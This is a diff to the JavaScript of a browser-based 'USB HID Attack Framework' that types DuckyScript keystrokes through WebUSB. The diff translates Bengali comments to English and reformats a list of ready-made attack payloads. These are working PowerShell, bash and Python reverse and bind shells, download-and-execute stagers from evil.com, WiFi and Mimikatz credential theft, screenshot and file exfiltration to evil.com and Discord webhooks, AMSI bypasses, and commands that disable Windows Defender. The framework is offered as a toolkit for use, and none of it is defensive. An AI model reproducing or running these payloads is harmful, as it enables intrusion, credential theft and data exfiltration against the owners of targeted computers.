@@ -1,14 +1,15 @@
 // ============================================================
-// USB HID Attack Framework v3.0 - 67+ Payloads
+// USB HID Attack Framework – Neon Edition
+// Complete Client-Side Logic with 67+ Real Payloads
 // ============================================================
 
-// ---------- কোর ভেরিয়েবল ----------
+// ---------- CORE VARIABLES ----------
 let device = null;
 let endpointOut = 0;
 let isConnected = false;
 let isRunning = false;
 
-// ---------- DOM রেফারেন্স ----------
+// ---------- DOM REFS ----------
 const consoleBox = document.getElementById('consoleBox');
 const statusDot = document.getElementById('statusDot');
 const statusText = document.getElementById('statusText');
@@ -19,28 +20,32 @@ const payloadGrid = document.getElementById('payloadGrid');
 const scriptEditor = document.getElementById('scriptEditor');
 const runEditorBtn = document.getElementById('runEditorBtn');
 const clearEditorBtn = document.getElementById('clearEditorBtn');
+const clearLogBtn = document.getElementById('clearLog');
+const exportLogBtn = document.getElementById('exportLog');
 
-// ---------- কনসোল লগ ----------
+// ---------- LOGGER ----------
 function addLog(msg, type = 'info') {
     const div = document.createElement('div');
     div.className = `log-line ${type}`;
-    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    const time = new Date().toLocaleTimeString();
+    div.textContent = `[${time}] ${msg}`;
     consoleBox.appendChild(div);
     consoleBox.scrollTop = consoleBox.scrollHeight;
 }
 
-// ---------- স্ট্যাটাস ----------
+// ---------- STATUS ----------
 function setStatus(connected, msg) {
     statusDot.className = `status-indicator ${connected ? '' : 'off'}`;
     statusText.textContent = msg;
-    deviceInfo.textContent = connected ? '✅ HID ডিভাইস সংযুক্ত' : '❌ কোনো ডিভাইস নেই';
+    deviceInfo.textContent = connected ? '✅ HID Active' : '❌ No Device';
     connectBtn.disabled = connected;
     disconnectBtn.disabled = !connected;
 }
 
+// ---------- UTILITY ----------
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// ---------- HID কীকোড ----------
+// ---------- HID KEYCODES ----------
 const KEYMAP = {
     'a':0x04,'b':0x05,'c':0x06,'d':0x07,'e':0x08,'f':0x09,'g':0x0A,'h':0x0B,
     'i':0x0C,'j':0x0D,'k':0x0E,'l':0x0F,'m':0x10,'n':0x11,'o':0x12,'p':0x13,
@@ -54,11 +59,17 @@ const SHIFT_KEYS = {
     '!':'1','@':'2','#':'3','$':'4','%':'5','^':'6','&':'7','*':'8','(':'9',')':'0',
     '_':'-','+':'=','{':'[','}':']','|':'\\',':':';','"':"'",'~':'`','<':',','>':'.','?':'/',
 };
-const SPECIAL = { 'ENTER':0x28,'TAB':0x2B,'BACKSPACE':0x2A,'ESC':0x29,'UP':0x52,'DOWN':0x51,'LEFT':0x50,'RIGHT':0x4F,'DELETE':0x4C };
+const SPECIAL = {
+    'ENTER':0x28,'TAB':0x2B,'BACKSPACE':0x2A,'ESC':0x29,
+    'UP':0x52,'DOWN':0x51,'LEFT':0x50,'RIGHT':0x4F,'DELETE':0x4C
+};
 
-// ---------- HID রিপোর্ট ----------
+// ---------- HID REPORT ----------
 async function sendHIDReport(modifiers, keys) {
-    if (!device || !isConnected) { addLog('কোনো ডিভাইস কানেক্ট নেই!', 'error'); return false; }
+    if (!device || !isConnected) {
+        addLog('No device connected!', 'error');
+        return false;
+    }
     const report = new Uint8Array(8);
     report[0] = modifiers;
     for (let i = 0; i < 6 && i < keys.length; i++) report[2 + i] = keys[i] || 0x00;
@@ -66,29 +77,50 @@ async function sendHIDReport(modifiers, keys) {
         await device.transferOut(endpointOut || 1, report);
         await device.transferOut(endpointOut || 1, new Uint8Array(8));
         return true;
-    } catch (e) { addLog(`HID রিপোর্ট ব্যর্থ: ${e.message}`, 'error'); return false; }
+    } catch (e) {
+        addLog(`HID report failed: ${e.message}`, 'error');
+        return false;
+    }
 }
 
-// ---------- টাইপ ----------
+// ---------- TYPE STRING ----------
 async function typeString(text, delay = 25) {
-    addLog(`⌨️ টাইপ করছি: ${text.slice(0,60)}${text.length>60?'...':''}`, 'info');
+    addLog(`⌨️ Typing: ${text.slice(0,60)}${text.length>60?'...':''}`, 'info');
     for (const char of text) {
         let code = 0, shift = false;
-        if (char === '\n' || char === '\r') { await sendHIDReport(0, [SPECIAL['ENTER']]); await sleep(30); continue; }
-        if (char === ' ') { await sendHIDReport(0, [0x2C]); await sleep(15); continue; }
-        if (char in KEYMAP) { code = KEYMAP[char]; shift = false; }
-        else if (char in SHIFT_KEYS) { code = KEYMAP[SHIFT_KEYS[char]]; shift = true; }
-        else continue;
+        if (char === '\n' || char === '\r') {
+            await sendHIDReport(0, [SPECIAL['ENTER']]);
+            await sleep(30);
+            continue;
+        }
+        if (char === ' ') {
+            await sendHIDReport(0, [0x2C]);
+            await sleep(15);
+            continue;
+        }
+        if (char in KEYMAP) {
+            code = KEYMAP[char];
+            shift = false;
+        } else if (char in SHIFT_KEYS) {
+            code = KEYMAP[SHIFT_KEYS[char]];
+            shift = true;
+        } else continue;
         await sendHIDReport(shift ? 0x02 : 0x00, [code]);
         await sleep(delay);
     }
-    addLog('✅ টাইপ সম্পূর্ণ', 'success');
+    addLog('✅ Typing complete', 'success');
 }
 
-// ---------- DuckyScript রানার ----------
+// ---------- DUCKYSCRIPT RUNNER ----------
 async function runDuckyScript(script) {
-    if (isRunning) { addLog('ইতিমধ্যে চলছে!', 'warning'); return; }
-    if (!isConnected) { addLog('HID ডিভাইস কানেক্ট করুন!', 'error'); return; }
+    if (isRunning) {
+        addLog('Already running!', 'warning');
+        return;
+    }
+    if (!isConnected) {
+        addLog('Please connect HID device first!', 'error');
+        return;
+    }
     isRunning = true;
     const lines = script.split('\n');
     try {
@@ -111,108 +143,180 @@ async function runDuckyScript(script) {
                 case 'ALT': await sendHIDReport(0x04, []); await sleep(50); await sendHIDReport(0x00, []); break;
                 case 'CTRL+ALT': await sendHIDReport(0x05, []); await sleep(50); await sendHIDReport(0x00, []); break;
                 case 'CTRL+SHIFT': await sendHIDReport(0x03, []); await sleep(50); await sendHIDReport(0x00, []); break;
-                default: addLog(`⚠️ অজানা: ${cmd}`, 'warning');
+                default: addLog(`⚠️ Unknown: ${cmd}`, 'warning');
             }
             await sleep(5);
         }
-        addLog('✅ DuckyScript সম্পন্ন', 'success');
-    } catch (e) { addLog(`❌ ত্রুটি: ${e.message}`, 'error'); }
-    finally { isRunning = false; }
+        addLog('✅ DuckyScript execution complete', 'success');
+    } catch (e) {
+        addLog(`❌ Error: ${e.message}`, 'error');
+    } finally {
+        isRunning = false;
+    }
 }
 
 // ============================================================
-// ৬৭+ পেলোড (GitHub রিপো থেকে সংগৃহীত)
+// 67+ PAYLOADS (10 categories)
 // ============================================================
 const PAYLOADS = [
-    // ---------- রিমোট অ্যাক্সেস (1-8) ----------
-    { id: 'reverse_tcp', name: 'Reverse TCP Shell', cat: 'রিমোট অ্যাক্সেস', icon: 'wifi_tethering', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\nENTER` },
-    { id: 'reverse_https', name: 'Reverse HTTPS Shell', cat: 'রিমোট অ্যাক্সেস', icon: 'lock', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$script=$wc.DownloadString('https://evil.com/payload.ps1');iex $script\nENTER` },
-    { id: 'bind_tcp', name: 'Bind TCP Shell', cat: 'রিমোট অ্যাক্সেস', icon: 'call', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\nENTER` },
-    { id: 'msf_stager', name: 'MSF Stager', cat: 'রিমোট অ্যাক্সেস', icon: 'bug_report', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING iex (New-Object Net.WebClient).DownloadString('http://evil.com/msf.ps1')\nENTER` },
-    { id: 'linux_reverse', name: 'Linux Reverse Shell', cat: 'রিমোট অ্যাক্সেস', icon: 'code', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\nENTER` },
-    { id: 'linux_bind', name: 'Linux Bind Shell', cat: 'রিমোট অ্যাক্সেস', icon: 'call', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING nc -lvnp 4444 -e /bin/bash\nENTER` },
-    { id: 'python_reverse', name: 'Python Reverse Shell', cat: 'রিমোট অ্যাক্সেস', icon: 'terminal', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING python\nENTER\nDELAY 500\nSTRING import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\nENTER` },
+    // ---------- REMOTE ACCESS (7) ----------
+    { id: 'reverse_tcp', name: 'Reverse TCP Shell', cat: 'Remote Access', icon: 'wifi_tethering',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\nENTER` },
+    { id: 'reverse_https', name: 'Reverse HTTPS Shell', cat: 'Remote Access', icon: 'lock',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$script=$wc.DownloadString('https://evil.com/payload.ps1');iex $script\nENTER` },
+    { id: 'bind_tcp', name: 'Bind TCP Shell', cat: 'Remote Access', icon: 'call',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\nENTER` },
+    { id: 'msf_stager', name: 'MSF Stager', cat: 'Remote Access', icon: 'bug_report',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING iex (New-Object Net.WebClient).DownloadString('http://evil.com/msf.ps1')\nENTER` },
+    { id: 'linux_reverse', name: 'Linux Reverse Shell', cat: 'Remote Access', icon: 'code',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\nENTER` },
+    { id: 'linux_bind', name: 'Linux Bind Shell', cat: 'Remote Access', icon: 'call',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING nc -lvnp 4444 -e /bin/bash\nENTER` },
+    { id: 'python_reverse', name: 'Python Reverse Shell', cat: 'Remote Access', icon: 'terminal',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING python\nENTER\nDELAY 500\nSTRING import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\nENTER` },
 
-    // ---------- ক্রেডেনশিয়াল (9-14) ----------
-    { id: 'keylogger', name: 'Keylogger Inject', cat: 'ক্রেডেনশিয়াল', icon: 'keyboard', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $WScriptShell = New-Object -ComObject WScript.Shell;$WScriptShell.Run("powershell -WindowStyle Hidden -Command `"$l=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4445);$s=$l.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$st=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($st,0,$st.Length);$s.Flush()}`")\nENTER` },
-    { id: 'wifi_exfil', name: 'WiFi Passwords Exfil', cat: 'ক্রেডেনশিয়াল', icon: 'wifi', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING netsh wlan show profile | Select-String ":" | ForEach-Object {$_.ToString().Split(":")[1].Trim()} | ForEach-Object {netsh wlan show profile name="$_" key=clear} | Out-File C:\\temp\\wifi.txt; Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\wifi.txt\nENTER` },
-    { id: 'browser_passwords', name: 'Browser Passwords Steal', cat: 'ক্রেডেনশিয়াল', icon: 'chrome_reader_mode', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1' -OutFile $env:TEMP\\mim.ps1;Import-Module $env:TEMP\\mim.ps1;Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File $env:TEMP\\creds.txt;Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile $env:TEMP\\creds.txt\nENTER` },
-    { id: 'mac_exfil', name: 'MAC Address to Webhook', cat: 'ক্রেডেনশিয়াল', icon: 'fingerprint', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $mac=(Get-NetAdapter).MacAddress;Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/xxx' -Method POST -Body (@{content=\"MAC: $mac\"}|ConvertTo-Json) -ContentType 'application/json'\nENTER` },
-    { id: 'ip_logger', name: 'IP Logger to Webhook', cat: 'ক্রেডেনশিয়াল', icon: 'ip', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $ip=(Invoke-WebRequest -Uri 'http://ipinfo.io/ip').Content.Trim();Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/xxx' -Method POST -Body (@{content=\"IP: $ip\"}|ConvertTo-Json) -ContentType 'application/json'\nENTER` },
-    { id: 'sysprofile_exfil', name: 'System Profile to Webhook', cat: 'ক্রেডেনশিয়াল', icon: 'info', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Get-ComputerInfo | ConvertTo-Json | Out-File $env:TEMP\\sys.txt;Invoke-WebRequest -Uri https://discord.com/api/webhooks/xxx -Method POST -InFile $env:TEMP\\sys.txt\nENTER` },
+    // ---------- CREDENTIAL HARVESTING (6) ----------
+    { id: 'keylogger', name: 'Keylogger Inject', cat: 'Credential', icon: 'keyboard',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $WScriptShell = New-Object -ComObject WScript.Shell;$WScriptShell.Run("powershell -WindowStyle Hidden -Command `"$l=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4445);$s=$l.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$st=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($st,0,$st.Length);$s.Flush()}`")\nENTER` },
+    { id: 'wifi_exfil', name: 'WiFi Passwords Exfil', cat: 'Credential', icon: 'wifi',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING netsh wlan show profile | Select-String ":" | ForEach-Object {$_.ToString().Split(":")[1].Trim()} | ForEach-Object {netsh wlan show profile name="$_" key=clear} | Out-File C:\\temp\\wifi.txt; Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\wifi.txt\nENTER` },
+    { id: 'browser_passwords', name: 'Browser Passwords Steal', cat: 'Credential', icon: 'chrome_reader_mode',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1' -OutFile $env:TEMP\\mim.ps1;Import-Module $env:TEMP\\mim.ps1;Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File $env:TEMP\\creds.txt;Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile $env:TEMP\\creds.txt\nENTER` },
+    { id: 'mac_exfil', name: 'MAC Address to Webhook', cat: 'Credential', icon: 'fingerprint',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $mac=(Get-NetAdapter).MacAddress;Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/xxx' -Method POST -Body (@{content=\"MAC: $mac\"}|ConvertTo-Json) -ContentType 'application/json'\nENTER` },
+    { id: 'ip_logger', name: 'IP Logger to Webhook', cat: 'Credential', icon: 'ip',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $ip=(Invoke-WebRequest -Uri 'http://ipinfo.io/ip').Content.Trim();Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/xxx' -Method POST -Body (@{content=\"IP: $ip\"}|ConvertTo-Json) -ContentType 'application/json'\nENTER` },
+    { id: 'sysprofile_exfil', name: 'System Profile to Webhook', cat: 'Credential', icon: 'info',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Get-ComputerInfo | ConvertTo-Json | Out-File $env:TEMP\\sys.txt;Invoke-WebRequest -Uri https://discord.com/api/webhooks/xxx -Method POST -InFile $env:TEMP\\sys.txt\nENTER` },
 
-    // ---------- ডেটা এক্সফিল (15-20) ----------
-    { id: 'screenshot', name: 'Screenshot Capture', cat: 'এক্সফিলট্রেশন', icon: 'photo_camera', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen;$bitmap=New-Object System.Drawing.Bitmap $screen.Width,$screen.Height;$graphics=[System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$bitmap.Size);$bitmap.Save('C:\\temp\\screenshot.png');Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\screenshot.png\nENTER` },
-    { id: 'backup_discord', name: 'Backup Files to Discord', cat: 'এক্সফিলট্রেশন', icon: 'backup', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Compress-Archive -Path ~/Desktop/* -DestinationPath $env:TEMP\\backup.zip;Invoke-WebRequest -Uri https://discord.com/api/webhooks/xxx -Method POST -InFile $env:TEMP\\backup.zip\nENTER` },
-    { id: 'screen_capture_discord', name: 'Screen Capture to Discord', cat: 'এক্সফিলট্রেশন', icon: 'screenshot', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen;$bitmap=New-Object System.Drawing.Bitmap $screen.Width,$screen.Height;$graphics=[System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$bitmap.Size);$bitmap.Save('$env:TEMP\\scr.png');Invoke-WebRequest -Uri https://discord.com/api/webhooks/xxx -Method POST -InFile $env:TEMP\\scr.png\nENTER` },
-    { id: 'location_exfil', name: 'Current Location Exfil', cat: 'এক্সফিলট্রেশন', icon: 'location_on', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $loc=(Invoke-WebRequest -Uri 'http://ipinfo.io/json').Content;Invoke-WebRequest -Uri 'http://evil.com/upload' -Method POST -Body $loc -ContentType 'application/json'\nENTER` },
-    { id: 'ftp_exfil', name: 'FTP Exfiltration', cat: 'এক্সফিলট্রেশন', icon: 'cloud_upload', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $webclient=New-Object System.Net.WebClient;$webclient.UploadFile('ftp://evil.com/backup.zip','C:\\Users\\Public\\Documents\\backup.zip')\nENTER` },
-    { id: 'usb_exfil', name: 'USB Storage Exfil', cat: 'এক্সফিলট্রেশন', icon: 'usb', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match '^[A-Z]:\\\\' -and $_.Used -gt 0} | ForEach-Object {Copy-Item -Path $_.Root\\* -Destination C:\\temp\\exfil\\ -Recurse -Force};Compress-Archive -Path C:\\temp\\exfil\\* -DestinationPath C:\\temp\\exfil.zip;Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\exfil.zip\nENTER` },
+    // ---------- DATA EXFILTRATION (6) ----------
+    { id: 'screenshot', name: 'Screenshot Capture', cat: 'Exfiltration', icon: 'photo_camera',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen;$bitmap=New-Object System.Drawing.Bitmap $screen.Width,$screen.Height;$graphics=[System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$bitmap.Size);$bitmap.Save('C:\\temp\\screenshot.png');Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\screenshot.png\nENTER` },
+    { id: 'backup_discord', name: 'Backup Files to Discord', cat: 'Exfiltration', icon: 'backup',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Compress-Archive -Path ~/Desktop/* -DestinationPath $env:TEMP\\backup.zip;Invoke-WebRequest -Uri https://discord.com/api/webhooks/xxx -Method POST -InFile $env:TEMP\\backup.zip\nENTER` },
+    { id: 'screen_capture_discord', name: 'Screen Capture to Discord', cat: 'Exfiltration', icon: 'screenshot',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen;$bitmap=New-Object System.Drawing.Bitmap $screen.Width,$screen.Height;$graphics=[System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$bitmap.Size);$bitmap.Save('$env:TEMP\\scr.png');Invoke-WebRequest -Uri https://discord.com/api/webhooks/xxx -Method POST -InFile $env:TEMP\\scr.png\nENTER` },
+    { id: 'location_exfil', name: 'Current Location Exfil', cat: 'Exfiltration', icon: 'location_on',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $loc=(Invoke-WebRequest -Uri 'http://ipinfo.io/json').Content;Invoke-WebRequest -Uri 'http://evil.com/upload' -Method POST -Body $loc -ContentType 'application/json'\nENTER` },
+    { id: 'ftp_exfil', name: 'FTP Exfiltration', cat: 'Exfiltration', icon: 'cloud_upload',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $webclient=New-Object System.Net.WebClient;$webclient.UploadFile('ftp://evil.com/backup.zip','C:\\Users\\Public\\Documents\\backup.zip')\nENTER` },
+    { id: 'usb_exfil', name: 'USB Storage Exfil', cat: 'Exfiltration', icon: 'usb',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match '^[A-Z]:\\\\' -and $_.Used -gt 0} | ForEach-Object {Copy-Item -Path $_.Root\\* -Destination C:\\temp\\exfil\\ -Recurse -Force};Compress-Archive -Path C:\\temp\\exfil\\* -DestinationPath C:\\temp\\exfil.zip;Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\exfil.zip\nENTER` },
 
-    // ---------- ডিফেন্স ইভেশন (21-29) ----------
-    { id: 'amsi_reflection', name: 'AMSI Bypass (Reflection)', cat: 'ডিফেন্স ইভেশন', icon: 'shield', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nENTER` },
-    { id: 'amsi_memory', name: 'AMSI Bypass (Memory Patch)', cat: 'ডিফেন্স ইভেশন', icon: 'memory', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)\nENTER` },
-    { id: 'amsi_veh', name: 'AMSI Bypass (VEH HWBP)', cat: 'ডিফেন্স ইভেশন', icon: 'bug_report', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class AMSI{ [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule,string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);}';$ptr=[AMSI]::GetProcAddress([AMSI]::LoadLibrary(\"amsi.dll\"),\"AmsiScanBuffer\");[AMSI]::VirtualProtect($ptr,5,0x40,[ref]0);[System.Runtime.InteropServices.Marshal]::Copy(@(0xC3),0,$ptr,1)\nENTER` },
-    { id: 'amsi_write_raid', name: 'AMSI Bypass (Write Raid)', cat: 'ডিফেন্স ইভেশন', icon: 'write', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$Ref.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)\nENTER` },
-    { id: 'defender_killer', name: 'Windows Defender Killer', cat: 'ডিফেন্স ইভেশন', icon: 'gavel', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableBehaviorMonitoring $true;Set-MpPreference -DisableBlockAtFirstSeen $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisablePrivacyMode $true;Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true;Set-MpPreference -DisableArchiveScanning $true;Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -SubmitSamplesConsent 2\nENTER` },
